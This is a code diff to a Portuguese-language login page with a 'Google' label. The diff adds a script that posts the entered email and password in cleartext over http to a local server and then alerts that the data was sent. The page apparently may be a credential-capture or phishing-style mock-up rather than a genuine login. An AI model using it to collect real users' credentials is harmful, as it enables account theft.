@@ -86,10 +86,31 @@
             <span>Google</span>
         </div>
         <p>Preencha os dados de utilizador.</p>
-        <input type="text" placeholder="Email">
-        <input type="password" placeholder="Senha">
+        <input type="text" id="email" placeholder="Email">
+        <input type="password" id="password" placeholder="Senha">
         <a href="#">Recuperar minha senha</a>
-        <button class="submit-btn">Entrar</button>
+        <button class="submit-btn" onclick="submitData()">Entrar</button>
     </div>
+    <script>
+        function submitData() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            fetch('http://localhost:3000/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ email, password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert('Dados enviados com sucesso!');
+            })
+            .catch(error => {
+                console.error('Erro:', error);
+            });
+        }
+    </script>
 </body>
 </html>
